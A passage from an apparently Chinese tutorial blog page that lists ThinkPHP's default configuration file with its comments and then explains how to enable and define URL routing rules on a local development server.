class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"><span class="comment">// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"><span class="comment">// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"><span class="comment">// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"><span class="comment">// | Author: liu21st &lt;liu21st@gmail.com&gt;</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line">/**</span><br><span class="line"> * ThinkPHP惯例配置文件</span><br><span class="line"> * 该文件请不要修改，如果要覆盖惯例配置的值，可在应用配置文件中设定和惯例不符的配置项</span><br><span class="line"> * 配置名称大小写任意，系统会统一转换成小写</span><br><span class="line"> * 所有配置参数都可以在生效前动态改变</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php">defined(<span class="string">'THINK_PATH'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php"><span class="keyword">return</span>  <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">    <span class="comment">/* 应用设定 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_USE_NAMESPACE'</span>     =&gt;  <span class="keyword">true</span>,    <span class="comment">// 应用类库是否使用命名空间</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_SUB_DOMAIN_DEPLOY'</span> =&gt;  <span class="keyword">false</span>,   <span class="comment">// 是否开启子域名部署</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_SUB_DOMAIN_RULES'</span>  =&gt;  <span class="keyword">array</span>(), <span class="comment">// 子域名部署规则</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_DOMAIN_SUFFIX'</span>     =&gt;  <span class="string">''</span>, <span class="comment">// 域名后缀 如果是com.cn net.cn 之类的后缀必须设置    </span></span></span><br><span class="line"><span class="php">    <span class="string">'ACTION_SUFFIX'</span>         =&gt;  <span class="string">''</span>, <span class="comment">// 操作方法后缀</span></span></span><br><span class="line"><span class="php">    <span class="string">'MULTI_MODULE'</span>          =&gt;  <span class="keyword">true</span>, <span class="comment">// 是否允许多模块 如果为false 则必须设置 DEFAULT_MODULE</span></span></span><br><span class="line"><span class="php">    <span class="string">'MODULE_DENY_LIST'</span>      =&gt;  <span class="keyword">array</span>(<span class="string">'Common'</span>,<span class="string">'Runtime'</span>),</span></span><br><span class="line"><span class="php">    <span class="string">'CONTROLLER_LEVEL'</span>      =&gt;  <span class="number">1</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'APP_AUTOLOAD_LAYER'</span>    =&gt;  <span class="string">'Controller,Model'</span>, <span class="comment">// 自动加载的应用类库层 关闭APP_USE_NAMESPACE后有效</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_AUTOLOAD_PATH'</span>     =&gt;  <span class="string">'Model'</span>, <span class="comment">// 自动加载的路径 关闭APP_USE_NAMESPACE后有效</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* Cookie设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_EXPIRE'</span>         =&gt;  <span class="number">0</span>,    <span class="comment">// Cookie有效期</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_DOMAIN'</span>         =&gt;  <span class="string">''</span>,      <span class="comment">// Cookie有效域名</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_PATH'</span>           =&gt;  <span class="string">'/'</span>,     <span class="comment">// Cookie路径</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_PREFIX'</span>         =&gt;  <span class="string">''</span>,      <span class="comment">// Cookie前缀 避免冲突</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_HTTPONLY'</span>       =&gt;  <span class="string">''</span>,      <span class="comment">// Cookie httponly设置</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 默认设定 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_M_LAYER'</span>       =&gt;  <span class="string">'Model'</span>, <span class="comment">// 默认的模型层名称</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_C_LAYER'</span>       =&gt;  <span class="string">'Controller'</span>, <span class="comment">// 默认的控制器层名称</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_V_LAYER'</span>       =&gt;  <span class="string">'View'</span>, <span class="comment">// 默认的视图层名称</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_LANG'</span>          =&gt;  <span class="string">'zh-cn'</span>, <span class="comment">// 默认语言</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_THEME'</span>         =&gt;  <span class="string">''</span>,	<span class="comment">// 默认模板主题名称</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_MODULE'</span>        =&gt;  <span class="string">'Home'</span>,  <span class="comment">// 默认模块</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_CONTROLLER'</span>    =&gt;  <span class="string">'Index'</span>, <span class="comment">// 默认控制器名称</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_ACTION'</span>        =&gt;  <span class="string">'index'</span>, <span class="comment">// 默认操作名称</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_CHARSET'</span>       =&gt;  <span class="string">'utf-8'</span>, <span class="comment">// 默认输出编码</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_TIMEZONE'</span>      =&gt;  <span class="string">'PRC'</span>,	<span class="comment">// 默认时区</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_AJAX_RETURN'</span>   =&gt;  <span class="string">'JSON'</span>,  <span class="comment">// 默认AJAX 数据返回格式,可选JSON XML ...</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_JSONP_HANDLER'</span> =&gt;  <span class="string">'jsonpReturn'</span>, <span class="comment">// 默认JSONP格式返回的处理方法</span></span></span><br><span class="line"><span class="php">    <span class="string">'DEFAULT_FILTER'</span>        =&gt;  <span class="string">'htmlspecialchars'</span>, <span class="comment">// 默认参数过滤方法 用于I函数...</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 数据库设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_TYPE'</span>               =&gt;  <span class="string">''</span>,     <span class="comment">// 数据库类型</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_HOST'</span>               =&gt;  <span class="string">''</span>, <span class="comment">// 服务器地址</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_NAME'</span>               =&gt;  <span class="string">''</span>,          <span class="comment">// 数据库名</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_USER'</span>               =&gt;  <span class="string">''</span>,      <span class="comment">// 用户名</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_PWD'</span>                =&gt;  <span class="string">''</span>,          <span class="comment">// 密码</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_PORT'</span>               =&gt;  <span class="string">''</span>,        <span class="comment">// 端口</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_PREFIX'</span>             =&gt;  <span class="string">''</span>,    <span class="comment">// 数据库表前缀</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_FIELDTYPE_CHECK'</span>    =&gt;  <span class="keyword">false</span>,       <span class="comment">// 是否进行字段类型检查</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_FIELDS_CACHE'</span>       =&gt;  <span class="keyword">true</span>,        <span class="comment">// 启用字段缓存</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_CHARSET'</span>            =&gt;  <span class="string">'utf8'</span>,      <span class="comment">// 数据库编码默认采用utf8</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_DEPLOY_TYPE'</span>        =&gt;  <span class="number">0</span>, <span class="comment">// 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_RW_SEPARATE'</span>        =&gt;  <span class="keyword">false</span>,       <span class="comment">// 数据库读写是否分离 主从式有效</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_MASTER_NUM'</span>         =&gt;  <span class="number">1</span>, <span class="comment">// 读写分离后 主服务器数量</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SLAVE_NO'</span>           =&gt;  <span class="string">''</span>, <span class="comment">// 指定从服务器序号</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SQL_BUILD_CACHE'</span>    =&gt;  <span class="keyword">false</span>, <span class="comment">// 数据库查询的SQL创建缓存</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SQL_BUILD_QUEUE'</span>    =&gt;  <span class="string">'file'</span>,   <span class="comment">// SQL缓存队列的缓存方式 支持 file xcache和apc</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SQL_BUILD_LENGTH'</span>   =&gt;  <span class="number">20</span>, <span class="comment">// SQL缓存的队列长度</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_SQL_LOG'</span>            =&gt;  <span class="keyword">false</span>, <span class="comment">// SQL执行日志记录</span></span></span><br><span class="line"><span class="php">    <span class="string">'DB_BIND_PARAM'</span>         =&gt;  <span class="keyword">false</span>, <span class="comment">// 数据库写入数据自动参数绑定</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 数据缓存设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_TIME'</span>       =&gt;  <span class="number">0</span>,      <span class="comment">// 数据缓存有效期 0表示永久缓存</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_COMPRESS'</span>   =&gt;  <span class="keyword">false</span>,   <span class="comment">// 数据缓存是否压缩缓存</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_CHECK'</span>      =&gt;  <span class="keyword">false</span>,   <span class="comment">// 数据缓存是否校验缓存</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_PREFIX'</span>     =&gt;  <span class="string">''</span>,     <span class="comment">// 缓存前缀</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_TYPE'</span>       =&gt;  <span class="string">'File'</span>,  <span class="comment">// 数据缓存类型,支持:File|Db|Apc|Memcache|Shmop|Sqlite|Xcache|Apachenote|Eaccelerator</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_PATH'</span>       =&gt;  TEMP_PATH,<span class="comment">// 缓存路径设置 (仅对File方式缓存有效)</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CACHE_SUBDIR'</span>     =&gt;  <span class="keyword">false</span>,    <span class="comment">// 使用子目录缓存 (自动根据缓存标识的哈希创建子目录)</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_PATH_LEVEL'</span>       =&gt;  <span class="number">1</span>,        <span class="comment">// 子目录缓存级别</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 错误设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'ERROR_MESSAGE'</span>         =&gt;  <span class="string">'页面错误！请稍后再试～'</span>,<span class="comment">//错误显示信息,非调试模式有效</span></span></span><br><span class="line"><span class="php">    <span class="string">'ERROR_PAGE'</span>            =&gt;  <span class="string">''</span>,	<span class="comment">// 错误定向页面</span></span></span><br><span class="line"><span class="php">    <span class="string">'SHOW_ERROR_MSG'</span>        =&gt;  <span class="keyword">false</span>,    <span class="comment">// 显示错误信息</span></span></span><br><span class="line"><span class="php">    <span class="string">'TRACE_MAX_RECORD'</span>      =&gt;  <span class="number">100</span>,    <span class="comment">// 每个级别的错误信息 最大记录数</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 日志设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_RECORD'</span>            =&gt;  <span class="keyword">false</span>,   <span class="comment">// 默认不记录日志</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_TYPE'</span>              =&gt;  <span class="string">'File'</span>, <span class="comment">// 日志记录类型 默认为文件方式</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_LEVEL'</span>             =&gt;  <span class="string">'EMERG,ALERT,CRIT,ERR'</span>,<span class="comment">// 允许记录的日志级别</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_FILE_SIZE'</span>         =&gt;  <span class="number">2097152</span>,	<span class="comment">// 日志文件大小限制</span></span></span><br><span class="line"><span class="php">    <span class="string">'LOG_EXCEPTION_RECORD'</span>  =&gt;  <span class="keyword">false</span>,    <span class="comment">// 是否记录异常信息日志</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* SESSION设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'SESSION_AUTO_START'</span>    =&gt;  <span class="keyword">true</span>,    <span class="comment">// 是否自动开启Session</span></span></span><br><span class="line"><span class="php">    <span class="string">'SESSION_OPTIONS'</span>       =&gt;  <span class="keyword">array</span>(), <span class="comment">// session 配置数组 支持type name id path expire domain 等参数</span></span></span><br><span class="line"><span class="php">    <span class="string">'SESSION_TYPE'</span>          =&gt;  <span class="string">''</span>, <span class="comment">// session hander类型 默认无需设置 除非扩展了session hander驱动</span></span></span><br><span class="line"><span class="php">    <span class="string">'SESSION_PREFIX'</span>        =&gt;  <span class="string">''</span>, <span class="comment">// session 前缀</span></span></span><br><span class="line"><span class="php">    <span class="comment">//'VAR_SESSION_ID'      =&gt;  'session_id',     //sessionID的提交变量</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 模板引擎设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CONTENT_TYPE'</span>     =&gt;  <span class="string">'text/html'</span>, <span class="comment">// 默认模板输出类型</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_ACTION_ERROR'</span>     =&gt;  THINK_PATH.<span class="string">'Tpl/dispatch_jump.tpl'</span>, <span class="comment">// 默认错误跳转对应的模板文件</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_ACTION_SUCCESS'</span>   =&gt;  THINK_PATH.<span class="string">'Tpl/dispatch_jump.tpl'</span>, <span class="comment">// 默认成功跳转对应的模板文件</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_EXCEPTION_FILE'</span>   =&gt;  THINK_PATH.<span class="string">'Tpl/think_exception.tpl'</span>,<span class="comment">// 异常页面的模板文件</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_DETECT_THEME'</span>     =&gt;  <span class="keyword">false</span>,       <span class="comment">// 自动侦测模板主题</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_TEMPLATE_SUFFIX'</span>  =&gt;  <span class="string">'.html'</span>,     <span class="comment">// 默认模板文件后缀</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_FILE_DEPR'</span>        =&gt;  <span class="string">'/'</span>, <span class="comment">//模板文件CONTROLLER_NAME与ACTION_NAME之间的分割符</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 布局设置</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_ENGINE_TYPE'</span>      =&gt;  <span class="string">'Think'</span>,     <span class="comment">// 默认模板引擎 以下设置仅对使用Think模板引擎有效</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CACHFILE_SUFFIX'</span>  =&gt;  <span class="string">'.php'</span>,      <span class="comment">// 默认模板缓存后缀</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_DENY_FUNC_LIST'</span>   =&gt;  <span class="string">'echo,exit'</span>,    <span class="comment">// 模板引擎禁用函数</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_DENY_PHP'</span>         =&gt;  <span class="keyword">false</span>, <span class="comment">// 默认模板引擎是否禁用PHP原生代码</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_L_DELIM'</span>          =&gt;  <span class="string">'&#123;'</span>,            <span class="comment">// 模板引擎普通标签开始标记</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_R_DELIM'</span>          =&gt;  <span class="string">'&#125;'</span>,            <span class="comment">// 模板引擎普通标签结束标记</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_VAR_IDENTIFY'</span>     =&gt;  <span class="string">'array'</span>,     <span class="comment">// 模板变量识别。留空自动判断,参数为'obj'则表示对象</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_STRIP_SPACE'</span>      =&gt;  <span class="keyword">true</span>,       <span class="comment">// 是否去除模板文件里面的html空格与换行</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CACHE_ON'</span>         =&gt;  <span class="keyword">true</span>,        <span class="comment">// 是否开启模板编译缓存,设为false则每次都会重新编译</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CACHE_PREFIX'</span>     =&gt;  <span class="string">''</span>,         <span class="comment">// 模板缓存前缀标识，可以动态改变</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_CACHE_TIME'</span>       =&gt;  <span class="number">0</span>,         <span class="comment">// 模板缓存有效期 0 为永久，(以数字为值，单位:秒)</span></span></span><br><span class="line"><span class="php">    <span class="string">'TMPL_LAYOUT_ITEM'</span>      =&gt;  <span class="string">'&#123;__CONTENT__&#125;'</span>, <span class="comment">// 布局模板的内容替换标识</span></span></span><br><span class="line"><span class="php">    <span class="string">'LAYOUT_ON'</span>             =&gt;  <span class="keyword">false</span>, <span class="comment">// 是否启用布局</span></span></span><br><span class="line"><span class="php">    <span class="string">'LAYOUT_NAME'</span>           =&gt;  <span class="string">'layout'</span>, <span class="comment">// 当前布局名称 默认为layout</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">// Think模板引擎标签库相关设定</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_BEGIN'</span>          =&gt;  <span class="string">'&lt;'</span>,  <span class="comment">// 标签库标签开始标记</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_END'</span>            =&gt;  <span class="string">'&gt;'</span>,  <span class="comment">// 标签库标签结束标记</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_LOAD'</span>           =&gt;  <span class="keyword">true</span>, <span class="comment">// 是否使用内置标签库之外的其它标签库，默认自动检测</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_BUILD_IN'</span>       =&gt;  <span class="string">'cx'</span>, <span class="comment">// 内置标签库名称(标签使用不必指定标签库名称),以逗号分隔 注意解析顺序</span></span></span><br><span class="line"><span class="php">    <span class="string">'TAGLIB_PRE_LOAD'</span>       =&gt;  <span class="string">''</span>,   <span class="comment">// 需要额外加载的标签库(须指定标签库名称)，多个以逗号分隔</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* URL设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_CASE_INSENSITIVE'</span>  =&gt;  <span class="keyword">true</span>,   <span class="comment">// 默认false 表示URL区分大小写 true则表示不区分大小写</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_MODEL'</span>             =&gt;  <span class="number">1</span>,       <span class="comment">// URL访问模式,可选参数0、1、2、3,代表以下四种模式：</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 0 (普通模式); 1 (PATHINFO 模式); 2 (REWRITE  模式); 3 (兼容模式)  默认为PATHINFO 模式</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PATHINFO_DEPR'</span>     =&gt;  <span class="string">'/'</span>,	<span class="comment">// PATHINFO模式下，各参数之间的分割符号</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PATHINFO_FETCH'</span>    =&gt;  <span class="string">'ORIG_PATH_INFO,REDIRECT_PATH_INFO,REDIRECT_URL'</span>, <span class="comment">// 用于兼容判断PATH_INFO 参数的SERVER替代变量列表</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_REQUEST_URI'</span>       =&gt;  <span class="string">'REQUEST_URI'</span>, <span class="comment">// 获取当前页面地址的系统变量 默认为REQUEST_URI</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_HTML_SUFFIX'</span>       =&gt;  <span class="string">'html'</span>,  <span class="comment">// URL伪静态后缀设置</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_DENY_SUFFIX'</span>       =&gt;  <span class="string">'ico|png|gif|jpg'</span>, <span class="comment">// URL禁止访问的后缀设置</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PARAMS_BIND'</span>       =&gt;  <span class="keyword">true</span>, <span class="comment">// URL变量绑定到Action方法参数</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PARAMS_BIND_TYPE'</span>  =&gt;  <span class="number">0</span>, <span class="comment">// URL变量绑定的类型 0 按变量名绑定 1 按变量顺序绑定</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PARAMS_FILTER'</span>     =&gt;  <span class="keyword">false</span>, <span class="comment">// URL变量绑定过滤</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_PARAMS_FILTER_TYPE'</span>=&gt;  <span class="string">''</span>, <span class="comment">// URL变量绑定过滤方法 如果为空 调用DEFAULT_FILTER</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_ROUTER_ON'</span>         =&gt;  <span class="keyword">false</span>,   <span class="comment">// 是否开启URL路由</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_ROUTE_RULES'</span>       =&gt;  <span class="keyword">array</span>(), <span class="comment">// 默认路由规则 针对模块</span></span></span><br><span class="line"><span class="php">    <span class="string">'URL_MAP_RULES'</span>         =&gt;  <span class="keyword">array</span>(), <span class="comment">// URL映射定义规则</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* 系统变量名称设置 */</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_MODULE'</span>            =&gt;  <span class="string">'m'</span>,     <span class="comment">// 默认模块获取变量</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_ADDON'</span>             =&gt;  <span class="string">'addon'</span>,     <span class="comment">// 默认的插件控制器命名空间变量</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_CONTROLLER'</span>        =&gt;  <span class="string">'c'</span>,    <span class="comment">// 默认控制器获取变量</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_ACTION'</span>            =&gt;  <span class="string">'a'</span>,    <span class="comment">// 默认操作获取变量</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_AJAX_SUBMIT'</span>       =&gt;  <span class="string">'ajax'</span>,  <span class="comment">// 默认的AJAX提交变量</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_JSONP_HANDLER'</span>     =&gt;  <span class="string">'callback'</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'VAR_PATHINFO'</span>          =&gt;  <span class="string">'s'</span>,    <span class="comment">// 兼容模式PATHINFO获取变量例如 ?s=/module/action/id/1 后面的参数取决于URL_PATHINFO_DEPR</span></span></span><br><span class="line"><span class="php">    <span class="string">'VAR_TEMPLATE'</span>          =&gt;  <span class="string">'t'</span>,    <span class="comment">// 默认模板切换变量</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="string">'HTTP_CACHE_CONTROL'</span>    =&gt;  <span class="string">'private'</span>,  <span class="comment">// 网页缓存控制</span></span></span><br><span class="line"><span class="php">    <span class="string">'CHECK_APP_DIR'</span>         =&gt;  <span class="keyword">true</span>,       <span class="comment">// 是否检查应用目录是否创建</span></span></span><br><span class="line"><span class="php">    <span class="string">'FILE_UPLOAD_TYPE'</span>      =&gt;  <span class="string">'Local'</span>,    <span class="comment">// 文件上传方式</span></span></span><br><span class="line"><span class="php">    <span class="string">'DATA_CRYPT_TYPE'</span>       =&gt;  <span class="string">'Think'</span>,    <span class="comment">// 数据加密方式</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">);</span></span><br></pre></td></tr></table></figure></p>
<h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd <span class="regexp">/home/</span>shiyanlou/ThinkPHP</span><br><span class="line">php -S <span class="string">localhost:</span><span class="number">8999</span></span><br></pre></td></tr></table></figure>
<p>cd /home/shiyanlou/ThinkPHP<br>php -S localhost:8999<br>在这里，我们访问到的是ThinkPHP自带的默认入口文件index.php也就是访问到的是IndexController的index()方法，这是因为ThinkPHP默认设置：<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'DEFAULT_CONTROLLER'</span>    =&gt;  <span class="string">'Index'</span></span><br></pre></td></tr></table></figure></p>
<p>如果你查看过ThinkPHP/Conf/convention.php文件，应该就会明白这个其实就是设置默认的控制器。</p>
<p>关于控制器(Controller)我们后面会仔细说，控制器的文件位于Application/Home/Controller 文件夹之下</p>
<p>了解这些基本知识之后，那么如果我们需要访问其它的页面，访问其他的控制器和方法呢？答案就在本节的路由教程中。</p>
<h2 id="路由定义规则"><a href="#路由定义规则" class="headerlink" title="路由定义规则"></a>路由定义规则</h2><p>在使用路由之前，确保你的URL支持PATH_INFO（或者兼容URL模式也可以，采用普通URL模式的情况下不支持路由功能）并且确认已开启一下的路由设置：<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'URL_ROUTER_ON'</span>   =&gt; <span class="keyword">true</span></span><br></pre></td></tr></table></figure></p>
<p>这里涉及到两个设置项，PATH_INFO和URL_ROUTER_ON，这些在ThinkPHP/Conf/convention.php文件都可以找到。 此处输入图片的描述 此处输入图片的描述</p>
<p>在满足以上两个条件之后，就可以配置路由规则了。在配置文件中使用URL_ROUTE_RULES参数进行配置，配置格式是一个数组，其格式为： ‘路由表达式’=&gt;’路由地址和传入参数’每个元素都代表一个路由规则，比如：在config.php 添加配置项<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'URL_ROUTE_RULES'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'blogs/:year/:month/:day'</span> =&gt; <span class="keyword">array</span>(<span class="string">'Index/archive'</span>, <span class="string">'status=1'</span>),</span><br><span class="line">    <span class="string">'blogs/:id'</span>               =&gt; <span class="string">'Index/read'</span>,</span><br><span class="line">),</span><br></pre></td></tr></table></figure></p>
<p>ThinkPHP按定义的顺序依次匹配路由规则，一旦匹配到的话，就会定位到路由定义中的控制器和操作方法去执行（你可以传入其他的参数），而后面的规则不会继续匹配</p>
<p>以上的路由配置说明：在每个路由表达式中，:后面跟参数名称，比如上面的:year,:month,:id都是参数名称，以:id为例，它指向Index控制器的read方法，这个方法接受一个$id的参数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"read page with"</span> .$id;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>你需要在IndexController中添加上面的代码，IndexController位于Application/Home/Controller之下</p>
<p>在浏览器输入<a href="http://localhost:8999/index.php/Home/blogs/2就可以看到" target="_blank" rel="noopener">http://localhost:8999/index.php/Home/blogs/2就可以看到</a></p>
<p>Home就代表Home模块，你可以简单地将它映射到相应的Home目录，这是由于在默认的配置中<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'DEFAULT_MODULE'</span>        =&gt;  <span class="string">'Home'</span></span><br></pre></td></tr></table></figure></p>
<p>你可以根据自己的需求修改，但本课依旧采用默认的Home模块.</p>
